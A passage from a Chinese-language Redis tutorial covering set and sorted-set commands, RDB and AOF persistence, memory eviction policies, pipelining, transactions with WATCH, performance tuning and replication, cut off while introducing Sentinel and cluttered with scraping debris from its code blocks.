Set是无序的，不可重复的String集合。,\n,与Set相关的常用命令：,\n,\n,SADD,：向指定Set中添加1个或多个member，如果指定Set不存在，会自动创建一个。时间复杂度O(N)，N为添加的member个数,\n,SREM,：从指定Set中移除1个或多个member，时间复杂度O(N)，N为移除的member个数,\n,SRANDMEMBER,：从指定Set中随机返回1个或多个member，时间复杂度O(N)，N为返回的member个数,\n,SPOP,：从指定Set中随机移除并返回count个member，时间复杂度O(N)，N为移除的member个数,\n,SCARD,：返回指定Set中的member个数，时间复杂度O(1),\n,SISMEMBER,：判断指定的value是否存在于指定Set中，时间复杂度O(1),\n,SMOVE,：将指定member从一个Set移至另一个Set,\n,\n,慎用的Set相关命令：,\n,\n,SMEMBERS,：返回指定Hash中所有的member，时间复杂度O(N),\n,SUNION/SUNIONSTORE,：计算多个Set的并集并返回/存储至另一个Set中，时间复杂度O(N)，N为参与计算的所有集合的总member数,\n,SINTER/SINTERSTORE,：计算多个Set的交集并返回/存储至另一个Set中，时间复杂度O(N)，N为参与计算的所有集合的总member数,\n,SDIFF/SDIFFSTORE,：计算1个Set与1或多个Set的差集并返回/存储至另一个Set中，时间复杂度O(N)，N为参与计算的所有集合的总member数,\n,\n,上述几个命令涉及的计算量大，应谨慎使用，特别是在参与计算的Set尺寸不可知的情况下，应严格避免使用。可以考虑通过SSCAN命令遍历获取相关Set的全部member（具体请见 ,https://redis.io/commands/scan, ），如果需要做并集/交集/差集计算，可以在客户端进行，或在不服务实时查询请求的Slave上进行。,\n,Sorted Set,\n,Redis Sorted Set是有序的、不可重复的String集合。Sorted Set中的每个元素都需要指派一个分数(score)，Sorted Set会根据score对元素进行升序排序。如果多个member拥有相同的score，则以字典序进行升序排序。,\n,Sorted Set非常适合用于实现排名。,\n,Sorted Set的主要命令：,\n,\n,ZADD,：向指定Sorted Set中添加1个或多个member，时间复杂度O(Mlog(N))，M为添加的member数量，N为Sorted Set中的member数量,\n,ZREM,：从指定Sorted Set中删除1个或多个member，时间复杂度O(Mlog(N))，M为删除的member数量，N为Sorted Set中的member数量,\n,ZCOUNT,：返回指定Sorted Set中指定score范围内的member数量，时间复杂度：O(log(N)),\n,ZCARD,：返回指定Sorted Set中的member数量，时间复杂度O(1),\n,ZSCORE,：返回指定Sorted Set中指定member的score，时间复杂度O(1),\n,ZRANK/ZREVRANK,：返回指定member在Sorted Set中的排名，ZRANK返回按升序排序的排名，ZREVRANK则返回按降序排序的排名。时间复杂度O(log(N)),\n,ZINCRBY,：同INCRBY，对指定Sorted Set中的指定member的score进行自增，时间复杂度O(log(N)),\n,\n,慎用的Sorted Set相关命令：,\n,\n,ZRANGE/ZREVRANGE,：返回指定Sorted Set中指定排名范围内的所有member，ZRANGE为按score升序排序，ZREVRANGE为按score降序排序，时间复杂度O(log(N)+M)，M为本次返回的member数,\n,ZRANGEBYSCORE/ZREVRANGEBYSCORE,：返回指定Sorted Set中指定score范围内的所有member，返回结果以升序/降序排序，min和max可以指定为-inf和+inf，代表返回所有的member。时间复杂度O(log(N)+M),\n,ZREMRANGEBYRANK/ZREMRANGEBYSCORE,：移除Sorted Set中指定排名范围/指定score范围内的所有member。时间复杂度O(log(N)+M),\n,\n,上述几个命令，应尽量避免传递[0 -1]或[-inf +inf]这样的参数，来对Sorted Set做一次性的完整遍历，特别是在Sorted Set的尺寸不可预知的情况下。可以通过ZSCAN命令来进行游标式的遍历（具体请见 ,https://redis.io/commands/scan, ），或通过LIMIT参数来限制返回member的数量（适用于ZRANGEBYSCORE和ZREVRANGEBYSCORE命令），以实现游标式的遍历。,\n,Bitmap和HyperLogLog,\n,Redis的这两种数据结构相较之前的并不常用，在本文中只做简要介绍，如想要详细了解这两种数据结构与其相关的命令，请参考官方文档,https://redis.io/topics/data-types-intro, 中的相关章节,\n,Bitmap在Redis中不是一种实际的数据类型，而是一种将String作为Bitmap使用的方法。可以理解为将String转换为bit数组。使用Bitmap来存储true/false类型的简单数据极为节省空间。,\n,HyperLogLogs是一种主要用于数量统计的数据结构，它和Set类似，维护一个不可重复的String集合，但是HyperLogLogs并不维护具体的member内容，只维护member的个数。也就是说，HyperLogLogs只能用于计算一个集合中不重复的元素数量，所以它比Set要节省很多内存空间。,\n,其他常用命令,\n,\n,EXISTS,：判断指定的key是否存在，返回1代表存在，0代表不存在，时间复杂度O(1),\n,DEL,：删除指定的key及其对应的value，时间复杂度O(N)，N为删除的key数量,\n,EXPIRE/PEXPIRE,：为一个key设置有效期，单位为秒或毫秒，时间复杂度O(1),\n,TTL/PTTL,：返回一个key剩余的有效时间，单位为秒或毫秒，时间复杂度O(1),\n,RENAME/RENAMENX,：将key重命名为newkey。使用RENAME时，如果newkey已经存在，其值会被覆盖；使用RENAMENX时，如果newkey已经存在，则不会进行任何操作，时间复杂度O(1),\n,TYPE,：返回指定key的类型，string, list, set, zset, hash。时间复杂度O(1),\n,CONFIG GET,：获得Redis某配置项的当前值，可以使用*通配符，时间复杂度O(1),\n,CONFIG SET,：为Redis某个配置项设置新值，时间复杂度O(1),\n,CONFIG REWRITE,：让Redis重新加载redis.conf中的配置,\n,\n,数据持久化,\n,Redis提供了将数据定期自动持久化至硬盘的能力，包括RDB和AOF两种方案，两种方案分别有其长处和短板，可以配合起来同时运行，确保数据的稳定性。,\n,必须使用数据持久化吗？,\n,Redis的数据持久化机制是可以关闭的。如果你只把Redis作为缓存服务使用，Redis中存储的所有数据都不是该数据的主体而仅仅是同步过来的备份，那么可以关闭Redis的数据持久化机制。,\n但通常来说，仍然建议至少开启RDB方式的数据持久化，因为：,\n,\n,RDB方式的持久化几乎不损耗Redis本身的性能，在进行RDB持久化时，Redis主进程唯一需要做的事情就是fork出一个子进程，所有持久化工作都由子进程完成,\n,Redis无论因为什么原因crash掉之后，重启时能够自动恢复到上一次RDB快照中记录的数据。这省去了手工从其他数据源（如DB）同步数据的过程，而且要比其他任何的数据恢复方式都要快,\n,现在硬盘那么大，真的不缺那一点地方,\n,\n,RDB,\n,采用RDB持久方式，Redis会定期保存数据快照至一个rbd文件中，并在启动时自动加载rdb文件，恢复之前保存的数据。可以在配置文件中配置Redis进行快照保存的时机：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsave [seconds] [changes]\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,save, ,[,seconds,], ,[,changes,], ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,意为在[seconds]秒内如果发生了[changes]次数据修改，则进行一次RDB快照保存，例如,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsave 60 100\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,save, ,60, ,100, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,会让Redis每60秒检查一次数据变更情况，如果发生了100次或以上的数据变更，则进行RDB快照保存。,\n可以配置多条save指令，让Redis执行多级的快照保存策略。,\nRedis默认开启RDB快照，默认的RDB策略如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsave 900 1\r\nsave 300 10\r\nsave 60 10000\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,save, ,900, ,1,save, ,300, ,10,save, ,60, ,10000, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,也可以通过,BGSAVE,命令手工触发RDB快照保存。,\n,RDB的优点：,\n,\n,对性能影响最小。如前文所述，Redis在保存RDB快照时会fork出子进程进行，几乎不影响Redis处理客户端请求的效率。,\n,每次快照会生成一个完整的数据快照文件，所以可以辅以其他手段保存多个时间点的快照（例如把每天0点的快照备份至其他存储媒介中），作为非常可靠的灾难恢复手段。,\n,使用RDB文件进行数据恢复比使用AOF要快很多。,\n,\n,RDB的缺点：,\n,\n,快照是定期生成的，所以在Redis crash时或多或少会丢失一部分数据。,\n,如果数据集非常大且CPU不够强（比如单核CPU），Redis在fork子进程时可能会消耗相对较长的时间（长至1秒），影响这期间的客户端请求。,\n,\n,AOF,\n,采用AOF持久方式时，Redis会把每一个写请求都记录在一个日志文件里。在Redis重启时，会把AOF文件中记录的所有写操作顺序执行一遍，确保数据恢复到最新。,\n,AOF默认是关闭的，如要开启，进行如下配置：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nappendonly yes\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,appendonly ,yes, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,AOF提供了三种fsync配置，always/everysec/no，通过配置项[appendfsync]指定：,\n,\n,appendfsync no：不进行fsync，将flush文件的时机交给OS决定，速度最快,\n,appendfsync always：每写入一条日志就进行一次fsync操作，数据安全性最高，但速度最慢,\n,appendfsync everysec：折中的做法，交由后台线程每秒fsync一次,\n,\n,随着AOF不断地记录写操作日志，必定会出现一些无用的日志，例如某个时间点执行了命令,SET key1 “abc”,，在之后某个时间点又执行了,SET key1 “bcd”,，那么第一条命令很显然是没有用的。大量的无用日志会让AOF文件过大，也会让数据恢复的时间过长。,\n所以Redis提供了AOF rewrite功能，可以重写AOF文件，只保留能够把数据恢复到最新状态的最小写操作集。,\nAOF rewrite可以通过,BGREWRITEAOF,命令触发，也可以配置Redis定期自动进行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nauto-aof-rewrite-percentage 100\r\nauto-aof-rewrite-min-size 64mb\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,auto,-,aof,-,rewrite,-,percentage, ,100,auto,-,aof,-,rewrite,-,min,-,size, ,64mb, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面两行配置的含义是，Redis在每次AOF rewrite时，会记录完成rewrite后的AOF日志大小，当AOF日志大小在该基础上增长了100%后，自动进行AOF rewrite。同时如果增长的大小没有达到64mb，则不会进行rewrite。,\n,AOF的优点：,\n,\n,最安全，在启用appendfsync always时，任何已写入的数据都不会丢失，使用在启用appendfsync everysec也至多只会丢失1秒的数据。,\n,AOF文件在发生断电等问题时也不会损坏，即使出现了某条日志只写入了一半的情况，也可以使用redis-check-aof工具轻松修复。,\n,AOF文件易读，可修改，在进行了某些错误的数据清除操作后，只要AOF文件没有rewrite，就可以把AOF文件备份出来，把错误的命令删除，然后恢复数据。,\n,\n,AOF的缺点：,\n,\n,AOF文件通常比RDB文件更大,\n,性能消耗比RDB高,\n,数据恢复速度比RDB慢,\n,\n,内存管理与数据淘汰机制,\n,最大内存设置,\n,默认情况下，在32位OS中，Redis最大使用3GB的内存，在64位OS中则没有限制。,\n,在使用Redis时，应该对数据占用的最大空间有一个基本准确的预估，并为Redis设定最大使用的内存。否则在64位OS中Redis会无限制地占用内存（当物理内存被占满后会使用,swap,空间），容易引发各种各样的问题。,\n,通过如下配置控制Redis使用的最大内存：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmaxmemory 100mb\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,maxmemory, ,100mb, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在内存占用达到了maxmemory后，再向Redis写入数据时，Redis会：,\n,\n,根据配置的数据淘汰策略尝试淘汰数据，释放空间,\n,如果没有数据可以淘汰，或者没有配置数据淘汰策略，那么Redis会对所有写请求返回错误，但读请求仍然可以正常执行,\n,\n,在为Redis设置maxmemory时，需要注意：,\n,\n,如果采用了Redis的主从同步，主节点向从节点同步数据时，会占用掉一部分内存空间，如果maxmemory过于接近主机的可用内存，导致数据同步时内存不足。所以设置的maxmemory不要过于接近主机可用的内存，留出一部分预留用作主从同步。,\n,\n,数据淘汰机制,\n,Redis提供了5种数据淘汰策略：,\n,\n,volatile-lru：使用LRU算法进行数据淘汰（淘汰上次使用时间最早的，且使用次数最少的key），只淘汰设定了有效期的key,\n,allkeys-lru：使用LRU算法进行数据淘汰，所有的key都可以被淘汰,\n,volatile-random：随机淘汰数据，只淘汰设定了有效期的key,\n,allkeys-random：随机淘汰数据，所有的key都可以被淘汰,\n,volatile-ttl：淘汰剩余有效期最短的key,\n,\n,最好为Redis指定一种有效的数据淘汰策略以配合maxmemory设置，避免在内存使用满后发生写入失败的情况。,\n,一般来说，推荐使用的策略是volatile-lru，并辨识Redis中保存的数据的重要性。对于那些重要的，绝对不能丢弃的数据（如配置类数据等），应不设置有效期，这样Redis就永远不会淘汰这些数据。对于那些相对不是那么重要的，并且能够热加载的数据（比如缓存最近登录的用户信息，当在Redis中找不到时，程序会去DB中读取），可以设置上有效期，这样在内存不够时Redis就会淘汰这部分数据。,\n,配置方法：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmaxmemory-policy volatile-lru   #默认是noeviction，即不进行数据淘汰\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,maxmemory,-,policy ,volatile,-,lru,   ,#默认是noeviction，即不进行数据淘汰, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,Pipelining,\n,Pipelining,\n,Redis提供许多批量操作的命令，如MSET/MGET/HMSET/HMGET等等，这些命令存在的意义是减少维护网络连接和传输数据所消耗的资源和时间。,\n例如连续使用5次SET命令设置5个不同的key，比起使用一次MSET命令设置5个不同的key，效果是一样的，但前者会消耗更多的RTT(Round Trip Time)时长，永远应优先使用后者。,\n,然而，如果客户端要连续执行的多次操作无法通过Redis命令组合在一起，例如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSET a \"abc\"\r\nINCR b\r\nHSET c name \"hi\"\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SET, ,a, ,\"abc\",INCR, ,b,HSET, ,c, ,name, ,\"hi\", ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,此时便可以使用Redis提供的pipelining功能来实现在一次交互中执行多条命令。,\n使用pipelining时，只需要从客户端一次向Redis发送多条命令（以rn）分隔，Redis就会依次执行这些命令，并且把每个命令的返回按顺序组装在一起一次返回，比如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ (printf \"PINGrnPINGrnPINGrn\"; sleep 1) | nc localhost 6379\r\n+PONG\r\n+PONG\r\n+PONG\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,(,printf, ,\"PINGrnPINGrnPINGrn\",;, ,sleep, ,1,), ,|, ,nc ,localhost, ,6379,+,PONG,+,PONG,+,PONG, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,大部分的Redis客户端都对Pipelining提供支持，所以开发者通常并不需要自己手工拼装命令列表。,\n,Pipelining的局限性,\n,Pipelining只能用于执行,连续且无相关性,的命令，当某个命令的生成需要依赖于前一个命令的返回时，就无法使用Pipelining了。,\n,通过Scripting功能，可以规避这一局限性,\n,事务与Scripting,\n,Pipelining能够让Redis在一次交互中处理多条命令，然而在一些场景下，我们可能需要在此基础上确保这一组命令是连续执行的。,\n,比如获取当前累计的PV数并将其清0,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n> GET vCount\r\n12384\r\n> SET vCount 0\r\nOK\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,>, ,GET ,vCount,12384,>, ,SET ,vCount, ,0,OK, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果在GET和SET命令之间插进来一个INCR vCount，就会使客户端拿到的vCount不准确。,\n,Redis的事务可以确保复数命令执行时的原子性。也就是说Redis能够保证：一个事务中的一组命令是绝对连续执行的，在这些命令执行完成之前，绝对不会有来自于其他连接的其他命令插进去执行。,\n,通过MULTI和EXEC命令来把这两个命令加入一个事务中：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n> MULTI\r\nOK\r\n> GET vCount\r\nQUEUED\r\n> SET vCount 0\r\nQUEUED\r\n> EXEC\r\n1) 12384\r\n2) OK\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,>, ,MULTI,OK,>, ,GET ,vCount,QUEUED,>, ,SET ,vCount, ,0,QUEUED,>, ,EXEC,1,), ,12384,2,), ,OK, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,Redis在接收到MULTI命令后便会开启一个事务，这之后的所有读写命令都会保存在队列中但并不执行，直到接收到EXEC命令后，Redis会把队列中的所有命令连续顺序执行，并以数组形式返回每个命令的返回结果。,\n,可以使用DISCARD命令放弃当前的事务，将保存的命令队列清空。,\n,需要注意的是，,Redis事务不支持回滚,：,\n如果一个事务中的命令出现了语法错误，大部分客户端驱动会返回错误，2.6.5版本以上的Redis也会在执行EXEC时检查队列中的命令是否存在语法错误，如果存在，则会自动放弃事务并返回错误。,\n但如果一个事务中的命令有非语法类的错误（比如对String执行HSET操作），无论客户端驱动还是Redis都无法在真正执行这条命令之前发现，所以事务中的所有命令仍然会被依次执行。在这种情况下，会出现一个事务中部分命令成功部分命令失败的情况，然而与RDBMS不同，Redis不提供事务回滚的功能，所以只能通过其他方法进行数据的回滚。,\n,通过事务实现CAS,\n,Redis提供了WATCH命令与事务搭配使用，实现CAS乐观锁的机制。,\n,假设要实现将某个商品的状态改为已售：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nif(exec(HGET stock:1001 state) == \"in stock\")\r\n    exec(HSET stock:1001 state \"sold\");\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,if,(,exec,(,HGET ,stock,:,1001, ,state,), ,==, ,\"in stock\",),    ,exec,(,HSET ,stock,:,1001, ,state, ,\"sold\",),;, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这一伪代码执行时，无法确保并发安全性，有可能多个客户端都获取到了”in stock”的状态，导致一个库存被售卖多次。,\n,使用WATCH命令和事务可以解决这一问题：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nexec(WATCH stock:1001);\r\nif(exec(HGET stock:1001 state) == \"in stock\") {\r\n    exec(MULTI);\r\n    exec(HSET stock:1001 state \"sold\");\r\n    exec(EXEC);\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,exec,(,WATCH ,stock,:,1001,),;,if,(,exec,(,HGET ,stock,:,1001, ,state,), ,==, ,\"in stock\",), ,{,    ,exec,(,MULTI,),;,    ,exec,(,HSET ,stock,:,1001, ,state, ,\"sold\",),;,    ,exec,(,EXEC,),;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,WATCH的机制是：在事务EXEC命令执行时，Redis会检查被WATCH的key，只有被WATCH的key从WATCH起始时至今没有发生过变更，EXEC才会被执行。如果WATCH的key在WATCH命令到EXEC命令之间发生过变化，则EXEC命令会返回失败。,\n,Scripting,\n,通过EVAL与EVALSHA命令，可以让Redis执行LUA脚本。这就类似于RDBMS的存储过程一样，可以把客户端与Redis之间密集的读/写交互放在服务端进行，避免过多的数据交互，提升性能。,\n,Scripting功能是作为事务功能的替代者诞生的，事务提供的所有能力Scripting都可以做到。Redis官方推荐使用LUA Script来代替事务，前者的效率和便利性都超过了事务。,\n,关于Scripting的具体使用，本文不做详细介绍，请参考官方文档 ,https://redis.io/commands/eval,\n,Redis性能调优,\n,尽管Redis是一个非常快速的内存数据存储媒介，也并不代表Redis不会产生性能问题。,\n前文中提到过，Redis采用单线程模型，所有的命令都是由一个线程串行执行的，所以当某个命令执行耗时较长时，会拖慢其后的所有命令，这使得Redis对每个任务的执行效率更加敏感。,\n,针对Redis的性能优化，主要从下面几个层面入手：,\n,\n,最初的也是最重要的，确保没有让Redis执行耗时长的命令,\n,使用pipelining将连续执行的命令组合执行,\n,操作系统的Transparent huge pages功能必须关闭：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\necho never > /sys/kernel/mm/transparent_hugepage/enabled\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,echo ,never, ,>, ,/,sys,/,kernel,/,mm,/,transparent_hugepage,/,enabled, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,如果在虚拟机中运行Redis，可能天然就有虚拟机环境带来的固有延迟。可以通过./redis-cli –intrinsic-latency 100命令查看固有延迟。同时如果对Redis的性能有较高要求的话，应尽可能在物理机上直接部署Redis。,\n,检查数据持久化策略,\n,考虑引入读写分离机制,\n,\n,长耗时命令,\n,Redis绝大多数读写命令的时间复杂度都在O(1)到O(N)之间，在文本和官方文档中均对每个命令的时间复杂度有说明。,\n,通常来说，O(1)的命令是安全的，O(N)命令在使用时需要注意，如果N的数量级不可预知，则应避免使用。例如对一个field数未知的Hash数据执行HGETALL/HKEYS/HVALS命令，通常来说这些命令执行的很快，但如果这个Hash中的field数量极多，耗时就会成倍增长。,\n又如使用SUNION对两个Set执行Union操作，或使用SORT对List/Set执行排序操作等时，都应该严加注意。,\n,避免在使用这些O(N)命令时发生问题主要有几个办法：,\n,\n,不要把List当做列表使用，仅当做队列来使用,\n,通过机制严格控制Hash、Set、Sorted Set的大小,\n,可能的话，将排序、并集、交集等操作放在客户端执行,\n,绝对禁止使用KEYS命令,\n,避免一次性遍历集合类型的所有成员，而应使用SCAN类的命令进行分批的，游标式的遍历,\n,\n,Redis提供了SCAN命令，可以对Redis中存储的所有key进行游标式的遍历，避免使用KEYS命令带来的性能问题。同时还有SSCAN/HSCAN/ZSCAN等命令，分别用于对Set/Hash/Sorted Set中的元素进行游标式遍历。SCAN类命令的使用请参考官方文档：,https://redis.io/commands/scan,\n,Redis提供了Slow Log功能，可以自动记录耗时较长的命令。相关的配置参数有两个：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nslowlog-log-slower-than xxxms  #执行时间慢于xxx毫秒的命令计入Slow Log\r\nslowlog-max-len xxx  #Slow Log的长度，即最大纪录多少条Slow Log\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,slowlog,-,log,-,slower,-,than ,xxxms,  ,#执行时间慢于xxx毫秒的命令计入Slow Log,slowlog,-,max,-,len ,xxx,  ,#Slow Log的长度，即最大纪录多少条Slow Log, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用,SLOWLOG GET [number],命令，可以输出最近进入Slow Log的number条命令。,\n使用,SLOWLOG RESET,命令，可以重置Slow Log,\n,网络引发的延迟,\n,\n,尽可能使用长连接或连接池，避免频繁创建销毁连接,\n,客户端进行的批量数据操作，应使用Pipeline特性在一次交互中完成。具体请参照本文的Pipelining章节,\n,\n,数据持久化引发的延迟,\n,Redis的数据持久化工作本身就会带来延迟，需要根据数据的安全级别和性能要求制定合理的持久化策略：,\n,\n,AOF + fsync always的设置虽然能够绝对确保数据安全，但每个操作都会触发一次fsync，会对Redis的性能有比较明显的影响,\n,AOF + fsync every second是比较好的折中方案，每秒fsync一次,\n,AOF + fsync never会提供AOF持久化方案下的最优性能,\n,使用RDB持久化通常会提供比使用AOF更高的性能，但需要注意RDB的策略配置,\n,每一次RDB快照和AOF Rewrite都需要Redis主进程进行fork操作。fork操作本身可能会产生较高的耗时，与CPU和Redis占用的内存大小有关。根据具体的情况合理配置RDB快照和AOF Rewrite时机，避免过于频繁的fork带来的延迟,\n,\n,Redis在fork子进程时需要将内存分页表拷贝至子进程，以占用了24GB内存的Redis实例为例，共需要拷贝24GB / 4kB * 8 = 48MB的数据。在使用单Xeon 2.27Ghz的物理机上，这一fork操作耗时216ms。,\n,可以通过,INFO,命令返回的latest_fork_usec字段查看上一次fork操作的耗时（微秒）,\n,Swap,引发的延迟,\n,当Linux将Redis所用的内存分页移至,swap,空间时，将会阻塞Redis进程，导致Redis出现不正常的延迟。,Swap,通常在物理内存不足或一些进程在进行大量I/O操作时发生，应尽可能避免上述两种情况的出现。,\n,/proc/,<,pid>/smaps文件中会保存进程的swap记录，通过查看这个文件，能够判断Redis的延迟是否由Swap产生。如果这个文件中记录了较大的Swap size，则说明延迟很有可能是Swap造成的。,\n,数据淘汰引发的延迟,\n,当同一秒内有大量key过期时，也会引发Redis的延迟。在使用时应尽量将key的失效时间错开。,\n,引入读写分离机制,\n,Redis的主从复制能力可以实现一主多从的多节点架构，在这一架构下，主节点接收所有写请求，并将数据同步给多个从节点。,\n在这一基础上，我们可以让从节点提供对实时性要求不高的读请求服务，以减小主节点的压力。,\n尤其是针对一些使用了长耗时命令的统计类任务，完全可以指定在一个或多个从节点上执行，避免这些长耗时命令影响其他请求的响应。,\n,关于读写分离的具体说明，请参见后续章节,\n,主从复制与集群分片,\n,主从复制,\n,Redis支持一主多从的主从复制架构。一个Master实例负责处理所有的写请求，Master将写操作同步至所有Slave。,\n借助Redis的主从复制，可以实现读写分离和高可用：,\n,\n,实时性要求不是特别高的读请求，可以在Slave上完成，提升效率。特别是一些周期性执行的统计任务，这些任务可能需要执行一些长耗时的Redis命令，可以专门规划出1个或几个Slave用于服务这些统计任务,\n,借助Redis Sentinel可以实现高可用，当Master crash后，Redis Sentinel能够自动将一个Slave晋升为Master，继续提供服务,\n,\n,启用主从复制非常简单，只需要配置多个Redis实例，在作为Slave的Redis实例中配置：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nslaveof 192.168.1.1 6379  #指定Master的IP和端口\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,slaveof, ,192.168.1.1, ,6379,  ,#指定Master的IP和端口, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当Slave启动后，会从Master进行一次冷启动数据同步，由Master触发BGSAVE生成RDB文件推送给Slave进行导入，导入完成后Master再将增量数据通过Redis Protocol同步给Slave。之后主从之间的数据便一直以Redis Protocol进行同步,\n,使用Sentinel做自动failover,\n,Redis的主从复制功能本身只是做数据同步，并不提供监控和自动failover能力，要通过主从复制功能来实现Redis的高可用，还需要引入一个组件：Redis 